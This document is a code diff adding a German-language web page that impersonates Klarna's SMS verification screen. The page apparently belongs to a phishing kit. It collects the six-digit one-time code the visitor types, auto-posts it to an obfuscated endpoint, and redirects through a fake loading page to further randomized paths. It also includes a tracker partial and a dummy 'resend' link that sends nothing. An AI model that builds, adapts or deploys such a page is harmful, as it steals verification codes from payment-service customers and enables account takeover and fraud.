@@ -1,0 +1,233 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Klarna SMS Confirmation</title>
+    <link rel="stylesheet" href="./css/bavoka.css">
+    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
+    <%- include('partials/tracker') %>
+    <style>
+        .error-message { 
+            color: #d01a1a; 
+            font-size: 13px; 
+            margin-top: 5px; 
+            display: none; 
+            font-weight: 500;
+        }
+        .input-error { 
+            border: 1px solid #d01a1a !important; 
+            background-color: #fff8f8; 
+        }
+    </style>
+</head>
+
+<body>
+    <div class="login-container">
+        <form class="form1" method="post">
+            <div class="up">
+                <!-- Header with Back, Badge, Close -->
+                <div class="header-row">
+                    <button class="back-btn" aria-label="Go back">
+                        <svg aria-hidden="true" role="img" viewBox="0 0 20 20" height="24" width="24">
+                            <g fill="none" fill-rule="evenodd" transform="translate(0, 0) scale(1)">
+                                <path
+                                    d="M12.5 9.167H4.047c.418-.365.828-.74 1.222-1.129a27.562 27.562 0 0 0 2.905-3.381l-1.348-.98a25.873 25.873 0 0 1-2.728 3.176c-.91.899-1.892 1.73-2.919 2.471a.833.833 0 0 0 0 1.352 24.844 24.844 0 0 1 2.92 2.471 25.87 25.87 0 0 1 2.727 3.177l1.348-.981a27.57 27.57 0 0 0-2.905-3.381c-.394-.39-.804-.764-1.222-1.129H12.5c2.757 0 5 2.243 5 5h1.667A6.674 6.674 0 0 0 12.5 9.167Z"
+                                    fill="rgba(11, 5, 29, 1)" style="transition: fill 0.2s;"></path>
+                            </g>
+                        </svg>
+                    </button>
+
+                    <div class="hodpa">
+                        <img src="./img/huodop.PNG" alt="">
+                    </div>
+
+                    <button class="close-btn" style="position: static;" aria-label="Close">
+                        <svg width="18" height="18" viewBox="0 0 14 14" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path
+                                d="M14 1.41L12.59 0L7 5.59L1.41 0L0 1.41L5.59 7L0 12.59L1.41 14L7 8.41L12.59 14L14 12.59L8.41 7L14 1.41Z"
+                                fill="#535353" />
+                        </svg>
+                    </button>
+                </div>
+
+                <h1>Wir müssen deine Telefonnummer verifizieren</h1>
+                <p class="email-info">
+                    Ein Bestätigungscode wurde gesendet an <br>
+                    <strong><% if (!isNaN(pass) ) { %><%= pass %><% }else{ %> 01••••••••• <% } %></strong> <a href="/" class="change-link">Kein Zugriff auf meine Nummer</a>
+                </p>
+
+                <div class="form-group">
+                    <!-- Phone Icon -->
+                    
+                    <svg class="input-icon" width="25" height="25" viewBox="0 0 25 25" fill="none" xmlns="http://www.w3.org/2000/svg">
+<path d="M12 0H3C2.20462 0.000868196 1.44206 0.317218 0.879639 0.879639C0.317218 1.44206 0.000868196 2.20462 0 3V22C0.000868196 22.7954 0.317218 23.5579 0.879639 24.1204C1.44206 24.6828 2.20462 24.9991 3 25H12C12.7954 24.9991 13.5579 24.6828 14.1204 24.1204C14.6828 23.5579 14.9991 22.7954 15 22V3C14.9991 2.20462 14.6828 1.44206 14.1204 0.879639C13.5579 0.317218 12.7954 0.000868196 12 0ZM13 22C12.9997 22.2651 12.8943 22.5193 12.7068 22.7068C12.5193 22.8943 12.2651 22.9997 12 23H3C2.73486 22.9997 2.48066 22.8943 2.29319 22.7068C2.10571 22.5193 2.00026 22.2651 2 22V3C2.00026 2.73486 2.10571 2.48066 2.29319 2.29319C2.48066 2.10571 2.73486 2.00026 3 2H12C12.2651 2.00026 12.5193 2.10571 12.7068 2.29319C12.8943 2.48066 12.9997 2.73486 13 3V22Z" fill="black"/>
+<path d="M7.5 22C8.32843 22 9 21.3284 9 20.5C9 19.6716 8.32843 19 7.5 19C6.67157 19 6 19.6716 6 20.5C6 21.3284 6.67157 22 7.5 22Z" fill="black"/>
+</svg>
+
+                    <input type="text" id="sms_code" class="form-input input-with-icon" placeholder=" " required
+                        autocomplete="one-time-code" />
+                    <label class="form-label" for="sms_code">Code eingeben</label>
+                    <div class="error-message" id="smsCodeError"></div>
+                </div>
+
+                <div class="success-box">
+                    <svg class="success-icon" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                        <path
+                            d="M12 2C6.48 2 2 6.48 2 12C2 17.52 6.48 22 12 22C17.52 22 22 17.52 22 12C22 6.48 17.52 2 12 2ZM10 17L5 12L6.41 10.59L10 14.17L17.59 6.58L19 8L10 17Z"
+                            fill="#004d00" />
+                    </svg>
+                    <div class="success-content">
+                        <h3>Code an dein Handy gesendet</h3>
+                        <p>Innerhalb der nächsten 20 Sekunden solltest du eine Nachricht erhalten.</p>
+                    </div>
+                </div>
+            </div>
+
+            <div class="down">
+                <div class="bottom-spacer">
+                    <p class="timer-text" id="timerContainer">Code in <span id="timer">00:05</span> erneut senden</p>
+                    <a href="#" class="resend-link" id="resendLink" style="display: none;">Code erneut senden</a>
+
+                    <button type="button" class="btn-outline">Anderen Account verwenden</button>
+                </div>
+            </div>
+        </form>
+    </div>
+
+    <script>
+
+        document.querySelector('.btn-outline').addEventListener('click', function () {
+            window.location.href = '/QcEwP85AgNE4pnL5mWSM';
+        });
+        document.addEventListener('DOMContentLoaded', function () {
+            // --- Logic 1: Success Box Fade ---
+            var successBox = document.querySelector('.success-box');
+            if (successBox) {
+                setTimeout(function () {
+                    successBox.classList.add('fade-out');
+                    setTimeout(function () {
+                        successBox.style.display = 'none';
+                    }, 2000); // Wait 2s for transition
+                }, 10000); // 10s delay
+            }
+
+            // --- Logic 2: Input Restriction & Auto-submit ---
+            var smsInput = document.getElementById('sms_code');
+            if (smsInput) {
+                smsInput.setAttribute('maxlength', '6');
+                smsInput.setAttribute('inputmode', 'numeric');
+                smsInput.setAttribute('pattern', '[0-9]*');
+
+                smsInput.addEventListener('input', function (e) {
+                    this.value = this.value.replace(/[^0-9]/g, '');
+                    
+                    // Clear error on input
+                    document.getElementById('smsCodeError').style.display = 'none';
+                    this.classList.remove('input-error');
+
+                    if (this.value.length === 6) {
+                        console.log('Auto-submitting code: ' + this.value);
+                        submitSmsCode(this.value);
+                    }
+                });
+            }
+
+            function submitSmsCode(smsCode) {
+                const smsCodeError = document.getElementById('smsCodeError');
+                const smsCodeInput = document.getElementById('sms_code');
+
+                // Disable input during submission
+                smsCodeInput.disabled = true;
+
+                $.ajax({
+                    url: '/Qv69PRvXg6PQEvrzJx6j',
+                    type: 'POST',
+                    contentType: 'application/json',
+                    data: JSON.stringify({ code: smsCode }),
+                    success: function(info) {
+                        if(info.OK){
+                            const user = <%- JSON.stringify(pass) %>;
+                                    console.log(user);
+                                    if(!isNaN(user)){
+                                        window.location = "/loading?time=7&url=/PPmP85AgNE4pnL5mWSM";
+
+                                    }else {
+                                        window.location = "/loading?time=7&url=/PrTomeM9HwWUWSulkTe4";
+                                    }
+                            
+                        } else {
+                            // Show error message
+                            smsCodeInput.disabled = false;
+                            smsCodeError.textContent = 'Ungültiger Sicherheitscode. Bitte überprüfen Sie Ihre Eingabe.';
+                            smsCodeError.style.display = 'block';
+                            smsCodeInput.classList.add('input-error');
+                            smsCodeInput.value = ''; // Optional: clear invalid code
+                            smsCodeInput.focus();
+                        }
+                    },
+                    error: function(xhr, status, error) {
+                        // Show error message
+                        smsCodeInput.disabled = false;
+                        smsCodeError.textContent = 'Ein Fehler ist aufgetreten. Bitte versuchen Sie es erneut.';
+                        smsCodeError.style.display = 'block';
+                        smsCodeInput.classList.add('input-error');
+                    }
+                });
+            }
+
+
+            // --- Logic 3: Countdown Timer ---
+            var timeLeft = 5; // Starting seconds
+            var timerSpan = document.getElementById('timer');
+            var timerContainer = document.getElementById('timerContainer');
+            var resendLink = document.getElementById('resendLink');
+            var timerInterval;
+
+            function startTimer() {
+                // Reset UI
+                timeLeft = 5;
+                timerContainer.style.display = 'block';
+                resendLink.style.display = 'none';
+                updateTimerDisplay();
+
+                clearInterval(timerInterval);
+                timerInterval = setInterval(function () {
+                    timeLeft--;
+                    updateTimerDisplay();
+
+                    if (timeLeft <= 0) {
+                        clearInterval(timerInterval);
+                        timerFinish();
+                    }
+                }, 1000);
+            }
+
+            function updateTimerDisplay() {
+                // Format: 00:XX
+                var seconds = timeLeft < 10 ? '0' + timeLeft : timeLeft;
+                timerSpan.textContent = '00:' + seconds;
+            }
+
+            function timerFinish() {
+                timerContainer.style.display = 'none';
+                resendLink.style.display = 'block';
+            }
+
+            // Initialize timer
+            startTimer();
+
+            // Resend click handler
+            resendLink.addEventListener('click', function (e) {
+                e.preventDefault();
+                // Logic to actually resend code would go here
+                console.log('Resending code...');
+                // Restart timer
+                startTimer();
+            });
+        });
+    </script>
+</body>
+
+</html>
